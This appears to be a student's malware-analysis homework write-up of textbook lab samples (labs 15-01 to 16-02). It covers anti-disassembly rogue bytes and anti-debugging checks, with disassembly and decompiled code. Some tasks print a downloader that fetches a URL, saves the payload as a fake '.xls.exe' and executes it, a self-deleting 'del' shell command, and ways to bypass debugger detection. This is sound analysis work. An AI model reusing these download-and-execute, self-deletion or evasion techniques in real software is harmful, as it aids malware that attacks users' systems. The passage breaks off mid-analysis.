.text:00401011 .text:00401011 loc_401011:; CODE XREF: .text:0040100E↑j .text:00401011 8B 45 0C mov eax, [ebp+0Ch] .text:00401011 ; ------------------------------- .text:00401014 8B db 8Bh ; ‹ .text:00401015 ; ------------------------------- .text:00401015 48 dec eax .text:00401016 04 0F add al, 0Fh .text:00401018 BE 11 83 FA 70 mov esi, 70FA8311h .text:0040101D 75 3F jnz short loc_40105E ... Lecture Note P29 You can see that jumping location turn to correctly named loc_401011. In addition, we found the rogue byte(流氓字節), E8, and turn into database(db). Then, we just keep doing this process and turn rogue byte to data.\nNote that, in .text:00401014, IDA Pro judge 8B is a data. However, after the correction of rogue byte, it should be transfer one by one. That is, 8B should be an opcode instead a data, so you must change it by hand just as below. You\u0026rsquo;ll see a huge difference to previous version. .text:00401011 loc_401011:; CODE XREF: .text:0040100E↑j .text:00401011 8B 45 0C mov eax, [ebp+0Ch] .text:00401014 8B 48 04 mov ecx, [eax+4] .text:00401017 0F BE 11 movsx edx, byte ptr [ecx] .text:0040101A 83 FA 70 cmp edx, 70h .text:0040101D 75 3F jnz short loc_40105E Rogue Byte 2\nBefore(8B4C55B3h) ... .text:0040101F 33 C0 xor eax, eax .text:00401021 74 01 jz short near ptr loc_401023+1 .text:00401023 .text:00401023 loc_401023:; CODE XREF: .text:00401021↑j .text:00401023 E8 8B 45 0C 8B call near ptr 8B4C55B3h .text:00401028 48 dec eax .text:00401029 04 0F add al, 0Fh .text:0040102B BE 51 02 83 FA mov esi, 0FA830251h .text:00401030 71 75 jno short near ptr loc_4010A4+3 .text:00401032 2B 33 sub esi, [ebx] .text:00401034 C0 74 01 E8 8B sal byte ptr [ecx+eax-18h], 8Bh ... After ... .text:0040101F 33 C0 xor eax, eax .text:00401021 74 01 jz short loc_401024 .text:00401021 ; ----------------------------- .text:00401023 E8 db 0E8h .text:00401024 ; ----------------------------- .text:00401024 .text:00401024 loc_401024:; CODE XREF: .text:00401021↑j .text:00401024 8B 45 0C mov eax, [ebp+0Ch] .text:00401024 ; ----------------------------- .text:00401027 8B db 8Bh ; ‹ .text:00401028 ; ----------------------------- .text:00401028 48 dec eax .text:00401029 04 0F add al, 0Fh .text:0040102B BE 51 02 83 FA mov esi, 0FA830251h .text:00401030 71 75 jno short near ptr loc_4010A4+3 .text:00401032 2B 33 sub esi, [ebx] .text:00401034 C0 74 01 E8 8B sal byte ptr [ecx+eax-18h], 8Bh ... Final ... .text:0040101F 33 C0 xor eax, eax .text:00401021 74 01 jz short loc_401024 .text:00401021 ; ----------------------------- .text:00401023 E8 db 0E8h .text:00401024 ; ----------------------------- .text:00401024 .text:00401024 loc_401024:; CODE XREF: .text:00401021↑j .text:00401024 8B 45 0C mov eax, [ebp+0Ch] .text:00401027 8B 48 04 mov ecx, [eax+4] .text:0040102A 0F BE 51 02 movsx edx, byte ptr [ecx+2] .text:0040102E 83 FA 71 cmp edx, 71h .text:00401031 75 2B jnz short loc_40105E .text:00401033 33 C0 xor eax, eax .text:00401035 74 01 jz short near ptr loc_401037+1 ... Rogue Byte hidden(It\u0026rsquo;s a hidden misdirection)\nBefore(8B4C55C7h) ... .text:00401033 33 C0 xor eax, eax .text:00401035 74 01 jz short near ptr loc_401037+1 .text:00401037 .text:00401037 loc_401037:; CODE XREF: .text:00401035↑j .text:00401037 E8 8B 45 0C 8B call near ptr 8B4C55C7h .text:0040103C 48 dec eax .text:0040103D 04 0F add al, 0Fh .text:0040103F BE 51 01 83 FA mov esi, 0FA830151h .text:00401044 db 64h .text:00401044 64 75 17 jnz short loc_40105E ... After ... .text:00401033 33 C0 xor eax, eax .text:00401035 74 01 jz short loc_401038 .text:00401035 ; ----------------------------- .text:00401037 E8 db 0E8h .text:00401038 ; ----------------------------- .text:00401038 .text:00401038 loc_401038:; CODE XREF: .text:00401035↑j .text:00401038 8B 45 0C mov eax, [ebp+0Ch] .text:00401038 ; ----------------------------- .text:0040103B 8B db 8Bh ; ‹ .text:0040103C ; ----------------------------- .text:0040103C 48 dec eax .text:0040103D 04 0F add al, 0Fh .text:0040103F BE 51 01 83 FA mov esi, 0FA830151h .text:00401044 db 64h .text:00401044 64 75 17 jnz short loc_40105E ... Final ... .text:00401033 33 C0 xor eax, eax .text:00401035 74 01 jz short loc_401038 .text:00401035 ; ----------------------------- .text:00401037 E8 db 0E8h .text:00401038 ; ----------------------------- .text:00401038 .text:00401038 loc_401038:; CODE XREF: .text:00401035↑j .text:00401038 8B 45 0C mov eax, [ebp+0Ch] .text:0040103B 8B 48 04 mov ecx, [eax+4] .text:0040103E 0F BE 51 01 movsx edx, byte ptr [ecx+1] .text:00401042 83 FA 64 cmp edx, 64h .text:00401045 75 17 jnz short loc_40105E ... Rogue Byte 3\nBefore(407020B8h) ... .text:00401047 33 C0 xor eax, eax .text:00401049 74 01 jz short near ptr loc_40104B+1 .text:0040104B .text:0040104B loc_40104B:; CODE XREF: .text:00401049↑j .text:0040104B E8 68 10 30 40 call near ptr 407020B8h .text:00401050 00 FF add bh, bh .text:00401052 15 00 20 40 00 adc eax, offset printf .text:00401057 83 C4 04 add esp, 4 After ... .text:00401047 33 C0 xor eax, eax .text:00401049 74 01 jz short loc_40104C .text:00401049 ; ---------------------------------- .text:0040104B E8 db 0E8h .text:0040104C ; ---------------------------------- .text:0040104C .text:0040104C loc_40104C:; CODE XREF: .text:00401049↑j .text:0040104C 68 10 30 40 00 push offset aGoodJob ; \u0026#34;Good Job!\u0026#34; .text:0040104C ; ---------------------------------- .text:00401051 FF db 0FFh ; ÿ .text:00401052 ; ---------------------------------- .text:00401052 15 00 20 40 00 adc eax, offset printf .text:00401057 83 C4 04 add esp, 4 .text:0040105A 33 C0 xor eax, eax .text:0040105C EB 15 jmp short loc_401073 ... Final ... .text:00401047 33 C0 xor eax, eax .text:00401049 74 01 jz short loc_40104C .text:00401049 ; ---------------------------------- .text:0040104B E8 db 0E8h .text:0040104C ; ---------------------------------- .text:0040104C .text:0040104C loc_40104C:; CODE XREF: .text:00401049↑j .text:0040104C 68 10 30 40 00 push offset aGoodJob ; \u0026#34;Good Job!\u0026#34; .text:00401051 FF 15 00 20 40 00 call ds:printf .text:00401057 83 C4 04 add esp, 4 .text:0040105A 33 C0 xor eax, eax .text:0040105C EB 15 jmp short loc_401073 ... Rogue Byte 4\nBefore ... .text:0040105E 33 C0 xor eax, eax .text:00401060 74 01 jz short near ptr loc_401062+1 .text:00401062 .text:00401062 loc_401062:; CODE XREF: .text:00401060↑j .text:00401062 E8 68 1C 30 40 call near ptr 40702CCFh .text:00401067 00 FF add bh, bh .text:00401069 15 00 20 40 00 adc eax, offset printf .text:0040106E 83 C4 04 add esp, 4 .text:00401071 33 C0 xor eax, eax ... After ... .text:0040105E 33 C0 xor eax, eax .text:00401060 74 01 jz short loc_401063 .text:00401060 ; ------------------------------------- .text:00401062 E8 db 0E8h .text:00401063 ; ------------------------------------- .text:00401063 .text:00401063 loc_401063:; CODE XREF: .text:00401060↑j .text:00401063 68 1C 30 40 00 push offset aSonIAmDisappoi ; \u0026#34;Son, I am disappoint.\u0026#34; .text:00401063 ; ------------------------------------- .text:00401068 FF db 0FFh ; ÿ .text:00401069 ; ------------------------------------- .text:00401069 15 00 20 40 00 adc eax, offset printf .text:0040106E 83 C4 04 add esp, 4 .text:00401071 33 C0 xor eax, eax ... Final ... .text:0040105E 33 C0 xor eax, eax .text:00401060 74 01 jz short loc_401063 .text:00401060 ; ------------------------------------- .text:00401062 E8 db 0E8h .text:00401063 ; ------------------------------------- .text:00401063 .text:00401063 loc_401063:; CODE XREF: .text:00401060↑j .text:00401063 68 1C 30 40 00 push offset aSonIAmDisappoi ; \u0026#34;Son, I am disappoint.\u0026#34; .text:00401068 FF 15 00 20 40 00 call ds:printf .text:0040106E 83 C4 04 add esp, 4 .text:00401071 33 C0 xor eax, eax ... Almost Done. However, you\u0026rsquo;ll encounter another problem that can not use F5 to disassembly. A window said please position the cursor within a function. Refer to this page can check the problem and solution. After you address this problem then you can disassembly by pressing F5.\nint __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax if ( argc != 2 || *argv[1] != \u0026#39;p\u0026#39; || argv[1][2] != \u0026#39;q\u0026#39; || argv[1][1] != \u0026#39;d\u0026#39; ) { printf(aSonIAmDisappoi); result = 0; } else { printf(Format); result = 0; } return result; } By observing this code, we can recognize the secret code pdq(Note that, must be a correct sequence) Question # What anti-disassembly technique is used in this binary? Ans: Refer to background of jz/jnz, the command xor eax eax will clear register eax and set Z flag as 1(represent it\u0026rsquo;s zero). Therefore, the next command will always True that will jump to loc_401010+1. Because, IDA Pro observe this jump command, it set the jump location at loc_401010+1. But, this conditional jump is actually unconditional and the jump location is misdirection. It thought the command will begin at E8 but actually it\u0026rsquo;ll begin at 8B. What rogue opcode is the disassembly tricked into disassembling? Ans: Opcode 0xE8 How many times is this technique used? Ans: 5 times as below .text:00401010 E8 8B 45 0C 8B call near ptr 8B4C55A0h .text:00401023 E8 8B 45 0C 8B call near ptr 8B4C55B3h .text:00401023 E8 8B 45 0C 8B call near ptr 8B4C55B3h .text:0040104B E8 68 10 30 40 call near ptr 407020B8h .text:00401062 E8 68 1C 30 40 call near ptr 40702CCFh What command-line argument will cause the program to print “Good Job!”? Ans: pdq Task 2: Lab 15-02.exe # Observation # First things first, we can observe that this files has anti-disassembly section. Therefore, before disassembling, we must fix the jump location to correct address. And, the detail of how to fix it can refer last problem.\nFix # Before(0AA11CDh) ... .text:0040115A 85 E4 test esp, esp .text:0040115C 75 01 jnz short near ptr loc_40115E+1 .text:0040115E .text:0040115E loc_40115E:; CODE XREF: .text:0040115C↑j .text:0040115E E9 6A 00 6A 00 jmp near ptr 0AA11CDh .text:0040115E ; --------------------------- .text:00401163 6A db 6Ah ... After ... .text:0040115A 85 E4 test esp, esp .text:0040115C 75 01 jnz short loc_40115F .text:0040115C ; --------------------------- .text:0040115E E9 db 0E9h .text:0040115F ; --------------------------- .text:0040115F .text:0040115F loc_40115F:; CODE XREF: .text:0040115C↑j .text:0040115F 6A 00 push 0 .text:00401161 6A 00 push 0 .text:00401163 6A 00 push 0 .text:00401165 6A 00 push 0 .text:00401167 E8 1A 02 00 00 call sub_401386 ... Before(40704241h) ... .text:004011D0 33 C0 xor eax, eax .text:004011D2 74 01 jz short near ptr loc_4011D4+1 .text:004011D4 .text:004011D4 loc_4011D4:; CODE XREF: .text:004011D2↑j .text:004011D4 E8 68 30 30 40 call near ptr 40704241h .text:004011D9 00 8D 95 60 FD FE add [ebp-1029F6Bh], cl .text:004011DF FF 52 FF call dword ptr [edx-1] .text:004011E2 15 2C 20 40 00 adc eax, offset strstr ... After ... .text:004011D0 33 C0 xor eax, eax .text:004011D2 74 01 jz short loc_4011D5 .text:004011D2 ; --------------------------- .text:004011D4 E8 db 0E8h .text:004011D5 ; --------------------------- .text:004011D5 .text:004011D5 loc_4011D5:; CODE XREF: .text:004011D2↑j .text:004011D5 68 30 30 40 00 push offset aBamboo ; \u0026#34;Bamboo::\u0026#34; .text:004011DA 8D 95 60 FD FE FF lea edx, [ebp-102A0h] .text:004011E0 52 push edx .text:004011E1 FF 15 2C 20 40 00 call ds:strstr ... Before(loc_401215) ... .text:00401215 loc_401215:; CODE XREF: .text:loc_401215↑j .text:00401215 EB FF jmp short near ptr loc_401215+1 .text:00401215 ; --------------------------- .text:00401217 C0 db 0C0h ; À .text:00401218 48 db 48h ; H .text:00401219 E8 db 0E8h ; è .text:0040121A F1 db 0F1h ; ñ ... After ... .text:00401212 ; --------------------------- .text:00401215 EB db 0EBh .text:00401216 ; --------------------------- .text:00401216 FF C0 inc eax .text:00401218 48 dec eax .text:00401219 E8 F1 00 00 00 call sub_40130F .text:0040121E 89 85 58 FD FE FF mov [ebp-102A8h], eax .text:00401224 68 00 00 A0 00 push 0A00000h .text:00401229 FF 15 28 20 40 00 call ds:malloc .text:0040122F 83 C4 04 add esp, 4 .text:00401232 89 85 54 FD FE FF mov [ebp-102ACh], eax .text:00401238 8B 8D 68 FD FF FF mov ecx, [ebp-298h] .text:0040123E 83 C1 08 add ecx, 8 .text:00401241 89 8D 68 FD FF FF mov [ebp-298h], ecx .text:00401247 6A 00 push 0 .text:00401249 6A 00 push 0 .text:0040124B 6A 00 push 0 .text:0040124D 6A 00 push 0 .text:0040124F 8B 95 68 FD FF FF mov edx, [ebp-298h] .text:00401255 52 push edx .text:00401256 8B 85 5C FD FE FF mov eax, [ebp-102A4h] .text:0040125C 50 push eax .text:0040125D FF 15 64 20 40 00 call ds:InternetOpenUrlA .text:00401263 89 85 64 FD FF FF mov [ebp-29Ch], eax ... Lecture Note P26\nBefore(0FF3C9FFFh) ... .text:00401269 74 03 jz short near ptr loc_40126D+1 .text:0040126B 75 01 jnz short near ptr loc_40126D+1 .text:0040126D .text:0040126D loc_40126D:; CODE XREF: .text:00401269↑j .text:0040126D ; .text:0040126B↑j .text:0040126D E8 8D 8D FC FE call near ptr 0FF3C9FFFh .text:0040126D ; --------------------------- .text:00401272 FF db 0FFh ; ÿ .text:00401273 FF db 0FFh ; ÿ .text:00401274 51 db 51h ; Q .text:00401275 68 db 68h ; h ... After ... .text:00401269 74 03 jz short loc_40126E .text:0040126B 75 01 jnz short loc_40126E .text:0040126B ; --------------------------- .text:0040126D E8 db 0E8h .text:0040126E ; --------------------------- .text:0040126E .text:0040126E loc_40126E:; CODE XREF: .text:00401269↑j .text:0040126E ; .text:0040126B↑j .text:0040126E 8D 8D FC FE FF FF lea ecx, [ebp-104h] .text:00401274 51 push ecx ... Before(0AA1D5Dh) ... .text:004012E6 loc_4012E6:; CODE XREF: .text:004012EC↓j .text:004012E6 66 B8 EB 05 mov ax, 5EBh .text:004012EA 31 C0 xor eax, eax .text:004012EC 74 FA jz short near ptr loc_4012E6+2 .text:004012EE E8 6A 0A 6A 00 call near ptr 0AA1D5Dh .text:004012F3 6A 00 push 0 ... After ... .text:004012E3 ; --------------------------- .text:004012E6 66 db 66h .text:004012E7 B8 db 0B8h ; ¸ .text:004012E8 ; --------------------------- .text:004012E8 .text:004012E8 loc_4012E8:; CODE XREF: .text:004012EC↓j .text:004012E8 EB 05 jmp short loc_4012EF .text:004012EA ; --------------------------- .text:004012EA 31 C0 xor eax, eax .text:004012EC 74 FA jz short loc_4012E8 .text:004012EC ; --------------------------- .text:004012EE E8 db 0E8h .text:004012EF ; --------------------------- .text:004012EF .text:004012EF loc_4012EF:; CODE XREF: .text:loc_4012E8↑j .text:004012EF 6A 0A push 0Ah .text:004012F1 6A 00 push 0 ... Analyze # After fixing the misdirection location, we can use disassembly function properly.\nint __cdecl main(int argc, const char **argv, const char **envp) { ... Buffer = 0; memset(\u0026amp;v8, 0, 65532u); v9 = 0; v10 = 0; if ( WSAStartup(514u, \u0026amp;WSAData) ) return -1; if ( gethostname(name, 256) ) { for ( i = 0; i \u0026lt; 256 \u0026amp;\u0026amp; name[i]; ++i ) { switch ( name[i] ) { case \u0026#39;Z\u0026#39;: name[i] = \u0026#39;A\u0026#39;; break; case \u0026#39;z\u0026#39;: name[i] = \u0026#39;a\u0026#39;; break; case \u0026#39;9\u0026#39;: name[i] = \u0026#39;0\u0026#39;; break; default: ++name[i]; break; } } hInternet = InternetOpenA(name, 1u, 0, 0, 0); if ( !\u0026amp;v5 ) JUMPOUT(*(_DWORD *)\u0026amp;byte_40115E); v4 = sub_401386(); hFile = InternetOpenUrlA(hInternet, v4, 0, 0, 0, 0); ... } You can see that in line 34. It call a function sub_401386() and set the return value as InterneetOpenUrlA\u0026rsquo;s parameter. In sub_401386(), it contains lots of string which seems a URL address named http://practicalmalwareanalysis.com/bamboo.html and InterneetOpenUrlA will visit this URL.\nContinue analyzing line 30, refer to Microsoft Document\nHINTERNET InternetOpenA( [in] LPCSTR lpszAgent, [in] DWORD dwAccessType, [in] LPCSTR lpszProxy, [in] LPCSTR lpszProxyBypass, [in] DWORD dwFlags ); [in] lpszAgent Pointer to a null-terminated string that specifies the name of the application or entity calling the WinINet functions. This name is used as the user agent in the HTTP protocol.\nWe can check user-agent in first parameter, name, of InternetOpenA function. Trace back to line 10 and refer to CSDN Description, this API will return host name from local host. In for-loop, it\u0026rsquo;ll transfer the host name. Each char Z → A, z → a, 9 → 0. In addition, the default method is increasing 1.\n... for ( i = 0; i \u0026lt; 256 \u0026amp;\u0026amp; name[i]; ++i ) { switch ( name[i] ) { case \u0026#39;Z\u0026#39;: name[i] = \u0026#39;A\u0026#39;; break; case \u0026#39;z\u0026#39;: name[i] = \u0026#39;a\u0026#39;; break; case \u0026#39;9\u0026#39;: name[i] = \u0026#39;0\u0026#39;; break; default: ++name[i]; break; } } ... Continue analyzing line 12\nint __cdecl main(int argc, const char **argv, const char **envp) { ... if ( gethostname(name, 256) ) { ... hInternet = InternetOpenA(name, 1u, 0, 0, 0); if ( !\u0026amp;v5 ) JUMPOUT(*(_DWORD *)\u0026amp;byte_40115E); v4 = sub_401386(); hFile = InternetOpenUrlA(hInternet, v4, 0, 0, 0, 0); if ( hFile \u0026amp;\u0026amp; InternetReadFile(hFile, \u0026amp;Buffer, 65535u, \u0026amp;dwNumberOfBytesRead) ) { InternetCloseHandle(hFile); Str = strstr(\u0026amp;Buffer, SubStr); if ( Str ) { *strstr(Str, asc_40303C) = 0; JUMPOUT(*(_DWORD *)\u0026amp;byte_401215); } result = 0; } ... } ... } We initialize the internet by InternetOpenA and open an URL by InternetOpenUrlA, then we download the data to local buffer by InternetReadFile.\nNote that, refer to Microsoft Document. It\u0026rsquo;ll store the data from open URL to \u0026amp;Buffer.\nReads data from a handle opened by the InternetOpenUrl, FtpOpenFile, or HttpOpenRequest function.\nBOOL InternetReadFile( [in] HINTERNET hFile, [out] LPVOID lpBuffer, [in] DWORD dwNumberOfBytesToRead, [out] LPDWORD lpdwNumberOfBytesRead );\n[out] lpBuffer Pointer to a buffer that receives the data.\nThen, we use strstr function(refer to this page) in line 15 to find the first SubStr in \u0026amp;Buffer and return the position of SubStr if it exist, otherwise, return null. What is variable of SubStr? → Bamboo:: .data:00403030 42 61 6D 62 6F 6F+SubStr db 'Bamboo::',0\nBecause IDA can not show the following disassembly code, we just check out the source code instead. Refer to the write up on CSDN.\nThe following code is aim to search the string :: by using strstr function. In addition, in line .text:00401212, it move 0 to ptr [eax]. That means put 0 to the first : in ::. It was used to terminate the string between Bamboo:: and ::.\nIn line .text:0040123E, ecx+8 means Str+8 and that aim to jump over the string Bamboo:: whose length is also 8.\nThen, use InternetOpenUrlA in line .text:0040125D to open URL\n.text:004011FD push offset asc_40303C ; \u0026#34;::\u0026#34; .text:00401202 mov eax, [ebp+Str] .text:00401208 push eax ; Str .text:00401209 call ds:strstr .text:0040120F add esp, 8 .text:00401212 mov byte ptr [eax], 0 .text:00401212 ; ------------------------------- .text:00401215 byte_401215 db 0EBh .text:00401216 ; ------------------------------- .text:00401216 inc eax .text:00401218 dec eax .text:00401219 call account_summary .text:0040121E mov [ebp+Filename], eax .text:00401224 push 0A00000h ; Size .text:00401229 call ds:malloc .text:0040122F add esp, 4 .text:00401232 mov [ebp+lpBuffer], eax .text:00401238 mov ecx, [ebp+Str] .text:0040123E add ecx, 8 .text:00401241 mov [ebp+Str], ecx .text:00401247 push 0 ; dwContext .text:00401249 push 0 ; dwFlags .text:0040124B push 0 ; dwHeadersLength .text:0040124D push 0 ; lpszHeaders .text:0040124F mov edx, [ebp+Str] .text:00401255 push edx ; lpszUrl .text:00401256 mov eax, [ebp+hInternet] .text:0040125C push eax ; hInternet .text:0040125D call ds:InternetOpenUrlA .text:00401263 mov [ebp+hFile], eax .text:00401269 jz short loc_40126E Use InternetReadFile to store the data in the file.\n.text:0040126E loc_40126E: ; CODE XREF: _main+269↑j .text:0040126E ; _main+26B↑j .text:0040126E lea ecx, [ebp+dwNumberOfBytesRead] .text:00401274 push ecx ; lpdwNumberOfBytesRead .text:00401275 push 10000h ; dwNumberOfBytesToRead .text:0040127A mov edx, [ebp+lpBuffer] .text:00401280 push edx ; lpBuffer .text:00401281 mov eax, [ebp+hFile] .text:00401287 push eax ; hFile .text:00401288 call ds:InternetReadFile .text:0040128E test eax, eax .text:00401290 jz short loc_401306 The file name store in ecx register. And ecx is associated with Filename at line .text:004012A0. Therefore, we trace back to where it from at line .text:0040121E\n.text:0040129B push offset Mode ; \u0026#34;wb\u0026#34; .text:004012A0 mov ecx, [ebp+Filename] .text:004012A6 push ecx ; Filename .text:004012A7 call ds:fopen .text:004012AD add esp, 8 .text:004012B0 mov [ebp+File], eax .text:004012B6 mov edx, [ebp+File] .text:004012BC push edx ; File .text:004012BD push 1 ; Count .text:004012BF mov eax, [ebp+dwNumberOfBytesRead] .text:004012C5 push eax ; Size .text:004012C6 mov ecx, [ebp+lpBuffer] .text:004012CC push ecx ; Str .text:004012CD call ds:fwrite .text:004012D3 add esp, 10h .text:004012D6 mov edx, [ebp+File] .text:004012DC push edx ; File .text:004012DD call ds:fclose .text:004012E3 add esp, 4 Following the code below, eax register is the return value from function account_summary. Then, we can trace back to what function account_summary is. .text:00401219 call account_summary .text:0040121E mov [ebp+Filename], eax .text:00401224 push 0A00000h ; Size The image below is the function accout_summary. By concatenating the whole characters → Account Summary.xls.exe. And this is the file name that we download the data from URL. Then, it used ShellExecuteA to execute this file and quit the process directly.\n.text:004012EF loc_4012EF: ; CODE XREF: _main:loc_4012E8↑j .text:004012EF push 0Ah ; nShowCmd .text:004012F1 push 0 ; lpDirectory .text:004012F3 push 0 ; lpParameters .text:004012F5 mov eax, [ebp+Filename] .text:004012FB push eax ; lpFile .text:004012FC push 0 ; lpOperation .text:004012FE push 0 ; hwnd .text:00401300 call ds:ShellExecuteA Question # What URL is initially requested by the program? Ans: http://practicalmalwareanalysis.com/bamboo.html How is the User-Agent generated? Ans: Trace back to line 10 and refer to CSDN Description, this API will return host name from local host. In for-loop, it\u0026rsquo;ll transfer the host name. Each char Z → A, z → a, 9 → 0. In addition, the default method is increasing 1. What does the program look for in the page it initially requests? Ans: Bamboo:: What does the program do with the information it extracts from the page? Ans: In addition to search the string Bamboo::, the process search another string :: which is transferred to a NULL(terminate symbol). The whole string between Bamboo:: and terminated symbol were be downloaded to file named Account Summary.xls.exe and executing the file after the downloading. Task 3: Lab 16-01.exe # Observation # When I execute this file, it seems to do nothing except delete itself, even I didn\u0026rsquo;t open x32dbg. And refer to this problem description, we can aware that this file exist anti-debugging function to prevent our work.\nAnalysis # First things first, we use IDA Pro to do static analysis. To use graph view to observe the whole structure in this program. We can see that a lots of sub_401000 in false statement after if statement. So, step into this sub function as below.\nvoid __noreturn sub_401000() { CHAR Filename; // [esp+Ch] [ebp-208h] CHAR Parameters; // [esp+110h] [ebp-104h] GetModuleFileNameA(0, \u0026amp;Filename, 260u); GetShortPathNameA(\u0026amp;Filename, \u0026amp;Filename, 260u); strcpy(\u0026amp;Parameters, aCDel); strcat(\u0026amp;Parameters, \u0026amp;Filename); strcat(\u0026amp;Parameters, aNul); ShellExecuteA(0, 0, File, \u0026amp;Parameters, 0, 0); exit(0); } What is \u0026amp;Parameters? → Like a buffer store nothing. What is aCDel? → db '/c del ',0 What is aNul? → db ' \u0026gt;\u0026gt; NUL',0\nIt used strcpy and strcat function to construct a shell code, /c del $Filename \u0026gt;\u0026gt; NUL, which will delete the file that can not retrieve. Check this.\nSo, our purpose is let if-statement be true and skip sub_401000 function.\nx32dbg Therefore, we used x32dbg to analyze it.\n1st sub_401000 at 0040356E Set EAX be 0 so that we can skip the delete function. Refer to Lecture Note P59, fs:[30] is the reference location of PEB(Microsoft Document), and this is obviously checking the BeingDebugged flag.(Notice that [eax+2] means PEB table\u0026rsquo;s 2nd position → BeingDebugged)\n... .text:00403554 mov eax, large fs:30h .text:0040355A mov bl, [eax+2] .text:0040355D mov [ebp+var_1820], bl .text:00403563 movsx eax, [ebp+var_1820] .text:0040356A test eax, eax .text:0040356C jz short loc_403573 .text:0040356E call sub_401000 ... 2nd sub_401000 at 0040358F Double click ZF to set it as 1, then you can skip delete function Refer to Lecture Note P60, [eax+18h] is obviously checked ProcessHeap flag\n... .text:00403573 loc_403573:; CODE XREF: _main+3C↑j .text:00403573 mov eax, large fs:30h .text:00403579 mov eax, [eax+18h] .text:0040357C db 3Eh .text:0040357C mov eax, [eax+10h] .text:00403580 mov [ebp+var_1824], eax .text:00403586 cmp [ebp+var_1824], 0 .text:0040358D jz short loc_403594 .text:0040358F call sub_401000 ... 3rd sub_401000 at 004035B0 Set EAX be 0 so that we can skip the delete function. Refer to Lecture Note P62, [eax+68h] is obviously checked NTGlobalFlag.\n... .text:00403594 loc_403594:; CODE XREF: _main+5D↑j .text:00403594 mov eax, large fs:30h .text:0040359A db 3Eh .text:0040359A mov eax, [eax+68h] .text:0040359E sub eax, 70h .text:004035A1 mov [ebp+var_1828], eax .text:004035A7 cmp [ebp+var_1828], 0 .text:004035AE jnz short loc_4035B5 .text:004035B0 call sub_401000 ... After these fixing, we can normally analyze this sample like Lab9-1.\nQuestion # Which anti-debugging techniques does this malware employ? Ans: checked BeingDebugged flag checked ProcessHeap flag checked NTGlobalFlag What happens when each anti-debugging technique succeeds? Ans: When the compare function succeed, it\u0026rsquo;ll execute sub_401000 function that will delete the file itself. How can you get around these anti-debugging techniques? Ans: Set EAX be 0 at 0040356A to get around BeingDebugged checking. Double click ZF to set it as 1 at 0040358D to get around ProcessHeap checking. Set EAX be 0 at 0040359E to get around NTGlobalFlag checking. How do you manually change the structures checked during run time? Ans: Just like what I showed above. Which OllyDbg plug-in will protect you from the anti-debugging techniques used by this malware? Ans: Refer to StackExchange, some people suggested ScyllaHide which is an open-source, actively developed anti-anti debug plugin. There are many hiding options in it. In addition, refer to other write up, they suggest Hyde, HideOD. Moreover, refer to other write up, they suggest PhontOm plugin can Task 4: Lab 16-02.exe # Observation # First things first, I execute this sample without parameters and it seems to need a 4 character password. Analyze # IDA Pro Before using graph view, we must observe the whole program including the code before the main function to check if it has TLS Callback as below. Note that, what is TLS can check this page Lecture Note P76 Using graph view in IDA. If it find a window named OLLYDBG($ ClassName), it\u0026rsquo;ll exit the process directly, otherwise, execute sub_401020(). void __stdcall TlsCallback_0(int a1, int a2, int a3) { if ( a2 == 1 \u0026amp;\u0026amp; FindWindowA(ClassName, 0) ) exit(0); if ( a2 == 2 ) sub_401020(); } Now let\u0026rsquo;s check main function in IDA int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax DWORD ThreadId; // [esp+0h] [ebp-8h] int v5; // [esp+4h] [ebp-4h] v5 = 1; if ( argc == 1 ) { printf(aUsageS4Charact, *argv); result = 0; } else { CreateThread(0, 0, StartAddress, 0, 0, \u0026amp;ThreadId); Sleep(1000u); v5 = strncmp(argv[1], \u0026amp;byte_408030, 4u); if ( v5 ) printf(aIncorrectPassw); else printf(aYouEnteredTheC); result = 0; } return result; } Note that, sub_402148 is just like Task 1 in HW1 is a printf function. Question # What happens when you run Lab16-02.exe from the command line? Ans: First things first, I execute this sample without parameters and it seems to need a 4 character password. What happens when you run Lab16-02.exe and guess the command-line parameter? Ans: What is the command-line password? Ans:\nLoad Lab16-02.exe into IDA Pro. Where in the main function is strncmp found? Ans: strncmp was found at .tls:0040123A. And according to the disassembly code that shown above, it aim to compare \u0026amp;byte_408030 with 4 bytes(P}ÿÿ). What happens when you load this malware into OllyDbg using the default settings? Ans: It terminated directly without any analyzing. What is unique about the PE structure of Lab16-02.exe? Ans: Using PEview to check the header and find it has TLS Table. Where is the callback located? (Hint: Use CTRL-E in IDA Pro.) Ans: Follow the hint, I found the callback location for TlsCallback_0 is 401060. Which anti-debugging technique is the program using to terminate immediately in the debugger and how can you avoid this check? Ans:\nBy the observation above, it\u0026rsquo;s obviously using TLS callback technique before main() to check if the user uses Ollydbg or not. The simplest way to bypass this technique is using HxD tool to amend jz to jnz at 00401078, then it\u0026rsquo;ll not exit directly. ... .tls:00401076 85 C0 test eax, eax .tls:00401078 74 07 jz short loc_401081 .tls:0040107A 6A 00 push 0 ; int .tls:0040107C E8 AC 0F 00 00 call _exit ... What is the command-line password you see in the debugger after you disable the anti-debugging technique? Ans: I used x32dbg instead because Ollydbg cannot entry tTLS section. And the password I observed is P}ÿÿ.\nDoes the password found in the debugger work on the command line? Ans: Not at all with byrr, p@ss, and P}ÿÿ.\nWhich anti-debugging techniques account for the different passwords in the debugger and on the command line, and how can you protect against them? Ans: The correct answer in command line is bzrr without using debugger.\nLecture Note P54 Refer to other write up\nLooking deeper into the TLS callback shows a second debugger check that looks for a changed error code after the call to OutputDebugString at 40103A. If no debugger is present, a new error should overwrite the existing value. Otherwise the global variable at 40A968 would be incremented.\nDWORD sub_401020() { DWORD result; // eax SetLastError(12345u); OutputDebugStringA(OutputString); result = GetLastError(); if ( result == 12345 ) ++byte_40A968; return result; } Then what is the matter of this problem? In .tls:0040109B, it has the instruction(mov bl, byte_40A968) about password generation that will use global variable 40A968. Therefore, if the 2nd scanner judge the user that used the debugger, variable 40A968 will increase, and then the password will different. Solution: Since this variable is incremented only when a debugger is detected, the increment instruction should be patched so that the variable remains constant.\nAnd another part that will affect password generation is BeingDebugged flag int __cdecl main(int argc, const char **argv, const char **envp) { if( argc == 1 ) ... else { CreateThread(0, 0, StartAddress, 0, 0, \u0026amp;ThreadId); Sleep(1000u); ... } ... } Note that, StartAddress is shown as below. DWORD __stdcall StartAddress(LPVOID lpThreadParameter) { unsigned int v1; // ebx signed int i; // ecx int v3; // ebx byte_408032 = 4 * __ROL1__(7, 6); byte_408032 ^= \u0026#39;?\u0026#39;; byte_408032 *= 2; byte_408030 = __ROL1__(-112, 2); byte_408031 = byte_40A968 + __ROL1__(22, 6); byte_408031 *= 2; byte_408033 = 56; byte_408032 = __ROR1__(byte_408032, 7); v1 = 